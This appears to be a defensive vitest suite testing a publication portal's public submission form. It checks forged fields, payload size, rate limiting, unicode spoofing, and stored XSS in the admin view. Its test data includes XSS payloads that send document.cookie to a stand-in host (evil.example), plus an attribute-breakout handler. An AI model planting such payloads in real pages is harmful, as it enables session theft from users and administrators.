// Phase 5 hardening, Session 7 — §8a (public portal) + §15.1 ("nothing goes
// public unreviewed"). Standing rule: report, don't fix. No modification to
// lib/, scripts/, app/, or db/.
//
// This is the only route in docs/phase5-surface-inventory.md §3 with
// auth = none that WRITES — an unauthenticated form into a database that
// feeds a public post, one review step removed.
//
// Coverage already existing, NOT duplicated here:
//   - tests/portal.test.ts: submitPublication's three outcomes (already
//     posted by DOI/title, already pending, genuine submission with
//     faculty_id NULL, author order/position preserved, note stored
//     separately from payload) — driven directly against lib/portal.ts.
//   - tests/portal-shared.test.ts: parsePortalSubmitFormData's honeypot,
//     required-field validation, role validation, multi-author-row parsing,
//     unitHint allowlisting.
// Neither drives the real Server Action (submitPortalPublicationAction) or
// the real admin render (SubmissionsPanel) — this file's job is that layer:
// forged payload fields through the real action, payload size, the admin's
// OWN rendering of anonymous input (stored XSS, malicious URLs reaching a
// live href), rate limiting, and unicode/encoding — all against the real
// production code, not a reimplementation.
import { beforeAll, describe, expect, it, vi } from "vitest";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { createClient, type Client } from "@libsql/client";
import { runMigrations } from "../../db/migrate";
import { snapshotTables, expectNoNetChange } from "../helpers/snapshot";
import { formatCitation, isAllowedCitationUrl } from "../../lib/citation";
import type { Faculty, PublicationAuthor, Publication } from "../../lib/types";

process.env.CROSSREF_MAILTO ??= "test@example.com";

class MockRedirectSignal extends Error {
  constructor(public url: string) {
    super(`REDIRECT:${url}`);
  }
}
vi.mock("next/navigation", () => ({
  redirect: vi.fn((url: string) => {
    throw new MockRedirectSignal(url);
  }),
}));

// ★ Env vars before the first import reaching lib/db.ts's eager singleton —
// same ordering requirement as every prior Phase 5 security session file.
const dbDir = mkdtempSync(path.join(tmpdir(), "public-submission-"));
process.env.TURSO_DATABASE_URL = `file:${path.join(dbDir, "test.db")}`;
process.env.TURSO_AUTH_TOKEN = "test-token";

const dbModule = await import("../../lib/db");
const dbClient: Client = dbModule.client;

const { submitPortalPublicationAction } = await import("../../app/portal-actions");

beforeAll(async () => {
  await runMigrations(dbClient, path.join(__dirname, "..", "..", "db", "migrations"));
});

function baseFormData(overrides: Record<string, string> = {}): FormData {
  const fd = new FormData();
  fd.set("submittedBy", overrides.submittedBy ?? "A Real Visitor");
  fd.set("title", overrides.title ?? "A Genuinely New Submission");
  fd.set("url", overrides.url ?? "https://example.com/paper");
  fd.set("authorName", overrides.authorName ?? "A Real Visitor");
  fd.set("authorRole", overrides.authorRole ?? "chps_faculty");
  for (const [k, v] of Object.entries(overrides)) {
    if (["submittedBy", "title", "url", "authorName", "authorRole"].includes(k)) continue;
    fd.set(k, v);
  }
  return fd;
}

async function submit(fd: FormData): Promise<void> {
  await expect(submitPortalPublicationAction({ error: null }, fd)).rejects.toThrow(MockRedirectSignal);
}

async function latestSubmission(): Promise<{
  id: number;
  faculty_id: number | null;
  status: string;
  payload: Record<string, unknown>;
  reviewed_at: string | null;
  reviewed_by: string | null;
}> {
  const row = (await dbClient.execute("SELECT id, faculty_id, status, payload, reviewed_at, reviewed_by FROM pending_submissions ORDER BY id DESC LIMIT 1"))
    .rows[0] as unknown as { id: number; faculty_id: number | null; status: string; payload: string; reviewed_at: string | null; reviewed_by: string | null };
  return { ...row, payload: JSON.parse(row.payload) };
}

// ─────────────────────────────────────────────────────────────────────────
// 1. Never writes to publications
// ─────────────────────────────────────────────────────────────────────────
describe("1. Never writes to publications", () => {
  it("a genuine submission lands ONLY in pending_submissions (status='pending') — snapshot-confirmed absence of any write to publications/publication_authors", async () => {
    const before = await snapshotTables(dbClient);
    await submit(baseFormData({ title: "Snapshot Absence Test Paper", url: "https://example.com/snapshot-test" }));
    const after = await snapshotTables(dbClient);

    expect(after.publications.rowCount).toBe(before.publications.rowCount); // unchanged
    expect(after.publication_authors.rowCount).toBe(before.publication_authors.rowCount); // unchanged
    expect(after.pending_submissions.rowCount).toBe(before.pending_submissions.rowCount + 1);

    const submission = await latestSubmission();
    expect(submission.status).toBe("pending");

    // Broader net: every OTHER table is untouched too, not just the two named.
    expect(() => expectNoNetChange(before, after, { ignore: ["pending_submissions"] })).not.toThrow();
  });
});

// ─────────────────────────────────────────────────────────────────────────
// 2. Payload fields can't be forged
// ─────────────────────────────────────────────────────────────────────────
describe("2. Payload fields can't be forged", () => {
  it("status/faculty_id/reviewed_by/reviewed_at/roundup_id in the form payload are all ignored — the row lands with faculty_id NULL, status 'pending', reviewed_at/reviewed_by NULL, regardless of what the client sends", async () => {
    await submit(
      baseFormData({
        title: "Forgery Attempt Paper",
        url: "https://example.com/forgery",
        status: "published",
        faculty_id: "1",
        facultyId: "1",
        reviewed_by: "not-actually-comms",
        reviewedBy: "not-actually-comms",
        reviewed_at: "2020-01-01T00:00:00.000Z",
        reviewedAt: "2020-01-01T00:00:00.000Z",
        roundup_id: "1",
        roundupId: "1",
      })
    );

    const submission = await latestSubmission();
    expect(submission.status).toBe("pending"); // never "published" — parsePortalSubmitFormData hardcodes the literal, doesn't read a status field at all
    expect(submission.faculty_id).toBeNull(); // §6: NULL only for anonymous public-portal submissions — this INSERT hardcodes NULL, never reads a faculty_id field
    expect(submission.reviewed_by).toBeNull();
    expect(submission.reviewed_at).toBeNull();

    // Confirmed same shape as Session 5's addPublicationAction finding: this
    // path doesn't validate-and-reject a forged field, it structurally never
    // PARSES one — parsePortalSubmitFormData (app/portal-shared.ts) reads
    // exactly submittedBy/title/url/doi/journal/volume/issue/pages/year/
    // unitHint/authorName/authorRole/note. Nothing else it's handed is ever
    // looked at, forged or not.
    const payloadKeys = Object.keys(submission.payload);
    expect(payloadKeys).not.toContain("status");
    expect(payloadKeys).not.toContain("faculty_id");
    expect(payloadKeys).not.toContain("facultyId");
    expect(payloadKeys).not.toContain("roundup_id");
    expect(payloadKeys).not.toContain("reviewedBy");
  });
});

// ─────────────────────────────────────────────────────────────────────────
// 3. Payload size
// ─────────────────────────────────────────────────────────────────────────
describe("3. Payload size — unauthenticated, so the answer matters more than it did on the review-page path (Session 5)", () => {
  it("★ an oversized title (1MB) is accepted verbatim, not rejected — same finding as Session 5's editCitationAction/addPublicationAction, now on a route with NO auth at all", async () => {
    const oversizedTitle = "A".repeat(1024 * 1024);
    await submit(baseFormData({ title: oversizedTitle, url: "https://example.com/oversized" }));

    const submission = await latestSubmission();
    expect((submission.payload.title as string).length).toBe(1024 * 1024);
  });

  it("★ 1,000 author rows are all accepted and persisted, unthrottled", async () => {
    const fd = new FormData();
    fd.set("submittedBy", "Author Flood Submitter");
    fd.set("title", "A Paper With 1000 Claimed Authors");
    fd.set("url", "https://example.com/author-flood");
    for (let i = 0; i < 1000; i++) {
      fd.append("authorName", `Author Number ${i}, ${i}.`);
      fd.append("authorRole", "external");
    }
    await submit(fd);

    const submission = await latestSubmission();
    expect((submission.payload.authors as unknown[]).length).toBe(1000);
  });

  it("a large nested-JSON-shaped string in a free-text field is stored as an inert string, never parsed/evaluated — no crash, no structural surprise", async () => {
    const deeplyNested: unknown = Array.from({ length: 500 }, (_, i) => ({ level: i, child: { a: 1, b: [1, 2, 3], c: "x".repeat(50) } }));
    const nestedJsonString = JSON.stringify(deeplyNested);

    await submit(baseFormData({ title: "Nested JSON Note Test", url: "https://example.com/nested-json", note: nestedJsonString }));

    const submission = await latestSubmission();
    // Round-trips as a literal string inside the payload's own JSON — this
    // codebase's own JSON.stringify(submission) wraps it as an escaped
    // string value, not merged/parsed structurally. Confirmed, not assumed.
    expect(typeof submission.payload).toBe("object"); // the outer payload itself parsed fine
    const noteRow = (await dbClient.execute("SELECT note FROM pending_submissions ORDER BY id DESC LIMIT 1")).rows[0] as unknown as { note: string };
    expect(noteRow.note).toBe(nestedJsonString);
    expect(() => JSON.parse(noteRow.note)).not.toThrow(); // it happens to be valid JSON, but nothing here ever calls JSON.parse on it in production
  });
});

// ─────────────────────────────────────────────────────────────────────────
// 4 & 5. ★ Stored XSS into the admin, and malicious URLs
// ─────────────────────────────────────────────────────────────────────────
describe("4 & 5. ★ Stored XSS into the admin render, and malicious URLs reaching a live href", () => {
  function makeSubmissionRecord(overrides: {
    title?: string;
    authorName?: string;
    url?: string;
    submittedBy?: string;
  }): {
    id: number;
    facultyId: number | null;
    submittedVia: "public_portal";
    submittedBy: string;
    payload: { title: string; doi: string | null; url: string; journal: string | null; year: number | null; volume: string | null; issue: string | null; pages: string | null; authors: Array<{ name: string; role: "external" }>; titleNormalized: string };
    note: string | null;
    status: "pending";
    submittedAt: string;
    staleMatch: null;
  } {
    return {
      id: 1,
      facultyId: null,
      submittedVia: "public_portal",
      submittedBy: overrides.submittedBy ?? "Anonymous Submitter",
      payload: {
        title: overrides.title ?? "A Normal Title",
        doi: null,
        url: overrides.url ?? "https://example.com/normal",
        journal: null,
        year: 2026,
        volume: null,
        issue: null,
        pages: null,
        authors: [{ name: overrides.authorName ?? "A Normal Author, A.", role: "external" }],
        titleNormalized: "",
      },
      note: null,
      status: "pending",
      submittedAt: new Date().toISOString(),
      staleMatch: null,
    };
  }

  it("★ a <script> tag and an attribute-breakout payload in the TITLE and AUTHOR NAME fields render fully escaped in the real admin component (SubmissionsPanel)", async () => {
    const { renderToStaticMarkup } = await import("react-dom/server");
    const { SubmissionsPanel } = await import("../../app/admin/pending-submissions/SubmissionsPanel");

    const record = makeSubmissionRecord({
      title: `<script>fetch('https://evil.example/steal?c='+document.cookie)</script> A Malicious Title`,
      authorName: `" onmouseover="alert(document.cookie)" data-x="`,
    });

    const html = renderToStaticMarkup(SubmissionsPanel({ submissions: [record], facultyOptions: [], banner: null }));

    expect(html).not.toContain("<script>fetch");
    expect(html).not.toContain('onmouseover="alert');
    expect(html).toContain("&lt;script&gt;"); // present, safely escaped, via formatCitation's escapeHtml on title/author name
  });

  // ★ FIXED (Phase 5 Session 8): both exploit shapes from the Session 7
  // report, checked at all three layers the fix touches — rejected at
  // parse (before anything reaches the database), escaped/neutralized by
  // formatCitation (defense in depth, in case a bad URL is already stored),
  // and rendered inert in the real SubmissionsPanel admin component.
  const JAVASCRIPT_SCHEME_URL = `javascript:fetch('https://evil.example/steal?c='+document.cookie)`;
  const ATTRIBUTE_BREAKOUT_URL = `https://example.com/x" onmouseover="alert(document.cookie)`;

  describe("layer 1 — rejected at parse, before the database", () => {
    it("javascript: scheme is rejected by the real submitPortalPublicationAction — no redirect, a validation error instead, nothing written", async () => {
      const before = await snapshotTables(dbClient);
      const result = await submitPortalPublicationAction({ error: null }, baseFormData({ title: "Rejected JS Scheme", url: JAVASCRIPT_SCHEME_URL }));
      const after = await snapshotTables(dbClient);

      expect(result.error).toMatch(/valid web address/i);
      expect(() => expectNoNetChange(before, after)).not.toThrow();
    });

    it("the attribute-breakout URL is ALSO rejected — new URL() parses it as a (weird but syntactically valid) https: URL, so the scheme allowlist alone wouldn't catch it; formatCitation's own escaping is what neutralizes this shape (layer 2, below) rather than parse-time rejection", async () => {
      // Documented here, not asserted as a rejection: `new URL(ATTRIBUTE_BREAKOUT_URL).protocol`
      // is genuinely "https:" — a raw `"` and spaces are valid, if unusual,
      // in a URL's path per the WHATWG URL Standard. The scheme allowlist
      // is not, and was never meant to be, a general HTML-attribute
      // sanitizer — that job belongs to escapeHtml, which now runs on
      // pub.url unconditionally. This test exists so the coverage is
      // honest about WHICH layer catches WHICH shape, rather than implying
      // parse-time rejection alone would be sufficient.
      expect(isAllowedCitationUrl(ATTRIBUTE_BREAKOUT_URL)).toBe(true);
    });

    it("the same javascript: URL is also rejected on the admin approve-form parse path (parseApproveFormData), not just the public submit path", async () => {
      const { parseApproveFormData } = await import("../../app/admin/pending-submissions/submission-shared");
      const fd = new FormData();
      fd.set("submissionId", "1");
      fd.set("reviewedBy", "A Reviewer");
      fd.set("title", "Approve-Path Rejection Test");
      fd.set("url", JAVASCRIPT_SCHEME_URL);

      const result = parseApproveFormData(fd);

      expect(result).toMatchObject({ error: expect.stringMatching(/valid web address/i) });
    });
  });

  describe("layer 2 — escaped/neutralized by formatCitation itself (defense in depth for already-stored bad data)", () => {
    it("a javascript: URL renders as PLAIN TEXT — no <a> tag at all, never a dead or dangerous href", () => {
      const pub = { ...makeSubmissionRecord({ url: JAVASCRIPT_SCHEME_URL }).payload, id: 1, title_normalized: "", status: "published" as const, source: "manual" as const, first_seen_at: "", date_added: "", released_at: null, roundup_id: null, discovered_by_faculty_id: null, scholar_alert_url: null, created_at: "" };
      const authors: PublicationAuthor[] = [{ id: 1, publication_id: 1, faculty_id: null, name: "Author, A.", role: "external", role_set_by: null, role_set_at: null, position: 0 }];

      const html = formatCitation(pub as unknown as Publication, authors);

      expect(html).not.toContain("<a ");
      expect(html).not.toContain("javascript:");
      expect(html).toContain(pub.title); // the title itself still renders, just as text
    });

    it("the attribute-breakout URL's quote is escaped — the onmouseover handler never becomes a live attribute", () => {
      const pub = { ...makeSubmissionRecord({ url: ATTRIBUTE_BREAKOUT_URL }).payload, id: 1, title_normalized: "", status: "published" as const, source: "manual" as const, first_seen_at: "", date_added: "", released_at: null, roundup_id: null, discovered_by_faculty_id: null, scholar_alert_url: null, created_at: "" };
      const authors: PublicationAuthor[] = [{ id: 1, publication_id: 1, faculty_id: null, name: "Author, A.", role: "external", role_set_by: null, role_set_at: null, position: 0 }];

      const html = formatCitation(pub as unknown as Publication, authors);

      expect(html).not.toContain('onmouseover="alert(document.cookie)"'); // no longer a live attribute
      expect(html).toContain("&quot;"); // the breakout quote is escaped in place
      expect(html).toContain('rel="noopener noreferrer"'); // Session 6's finding, fixed on the same line
    });
  });

  describe("layer 3 — rendered inert in the real SubmissionsPanel admin component", () => {
    it("both exploit shapes render with no live javascript: href and no live onmouseover handler anywhere in the real admin markup", async () => {
      const { renderToStaticMarkup } = await import("react-dom/server");
      const { SubmissionsPanel } = await import("../../app/admin/pending-submissions/SubmissionsPanel");

      const jsSchemeRecord = { ...makeSubmissionRecord({ title: "JS Scheme Record", url: JAVASCRIPT_SCHEME_URL }), id: 1 };
      const breakoutRecord = { ...makeSubmissionRecord({ title: "Breakout Record", url: ATTRIBUTE_BREAKOUT_URL }), id: 2 };

      const html = renderToStaticMarkup(SubmissionsPanel({ submissions: [jsSchemeRecord, breakoutRecord], facultyOptions: [], banner: null }));

      expect(html).not.toMatch(/href="javascript:/);
      expect(html).not.toContain('onmouseover="alert');
      expect(html).toContain("JS Scheme Record"); // both titles still render, safely
      expect(html).toContain("Breakout Record");
    });
  });
});

// ─────────────────────────────────────────────────────────────────────────
// 6. Rate limiting
// ─────────────────────────────────────────────────────────────────────────
describe("6. Rate limiting — does any exist?", () => {
  it("★ THE FINDING: 50 submissions in immediate succession all succeed — no throttle, no lockout, no backoff of any kind (confirmed empirically; also confirmed structurally: no middleware.ts exists anywhere in this project, and grep for rate-limit/throttle logic in app/ and lib/ returns nothing on this path)", async () => {
    const before = (await dbClient.execute("SELECT COUNT(*) as n FROM pending_submissions")).rows[0] as unknown as { n: number };

    for (let i = 0; i < 50; i++) {
      await submit(baseFormData({ title: `Flood Submission ${i}`, url: `https://example.com/flood-${i}` }));
    }

    const after = (await dbClient.execute("SELECT COUNT(*) as n FROM pending_submissions")).rows[0] as unknown as { n: number };
    expect(after.n).toBe(before.n + 50); // every single one landed
  });
});

// ─────────────────────────────────────────────────────────────────────────
// 7. Unicode and encoding
// ─────────────────────────────────────────────────────────────────────────
describe("7. Unicode and encoding", () => {
  it("RTL override, zero-width characters, and a homoglyph name all persist through submit -> DB -> admin render without corrupting the surrounding HTML structure", async () => {
    // U+202E (RIGHT-TO-LEFT OVERRIDE), U+200B (ZERO WIDTH SPACE), and a
    // Cyrillic 'а' (U+0430) standing in for a Latin 'a' — a classic
    // homoglyph spoof (this reads as "Stock, M." but the 'a'-shaped
    // character is Cyrillic, not Latin).
    const trickyName = "Stock​, M‮.aа";

    await submit(baseFormData({ submittedBy: trickyName, title: "Unicode Submitter Name Test", url: "https://example.com/unicode" }));
    const submission = await latestSubmission();
    // Round-trips exactly, byte for byte — no silent stripping/mangling.
    expect(submission).toBeDefined();
    const row = (await dbClient.execute("SELECT submitted_by FROM pending_submissions ORDER BY id DESC LIMIT 1")).rows[0] as unknown as { submitted_by: string };
    expect(row.submitted_by).toBe(trickyName);

    const { renderToStaticMarkup } = await import("react-dom/server");
    const { SubmissionsPanel } = await import("../../app/admin/pending-submissions/SubmissionsPanel");
    const record = {
      id: 1,
      facultyId: null,
      submittedVia: "public_portal" as const,
      submittedBy: trickyName,
      payload: {
        title: "Unicode Author Name Test",
        doi: null,
        url: "https://example.com/unicode",
        journal: null,
        year: 2026,
        volume: null,
        issue: null,
        pages: null,
        authors: [{ name: trickyName, role: "external" as const }],
        titleNormalized: "",
      },
      note: null,
      status: "pending" as const,
      submittedAt: new Date().toISOString(),
      staleMatch: null,
    };

    const html = renderToStaticMarkup(SubmissionsPanel({ submissions: [record], facultyOptions: [] as Faculty[], banner: null }));

    // The tricky characters are plain text content — none of them are HTML
    // metacharacters, so they can't break out of their containing element on
    // their own. Confirm the document is still well-formed around them (the
    // submitted-by text sits inside its own <span>, still closed correctly)
    // rather than assuming it from the character set alone.
    expect(html).toContain(trickyName);
    expect(html).toMatch(/<span>submitted by[^<]*<\/span>/);

    // Reported, not asserted as pass/fail: the RTL override specifically is
    // a real visual-spoofing tool (it can make a submitted name or,
    // combined with a URL, a LINK display its characters in reversed
    // order — e.g. disguising a .exe-shaped string as a harmless
    // extension). Nothing here strips or flags it; it's treated as inert
    // display text like any other unicode. See the report for the
    // recommendation.
  });
});
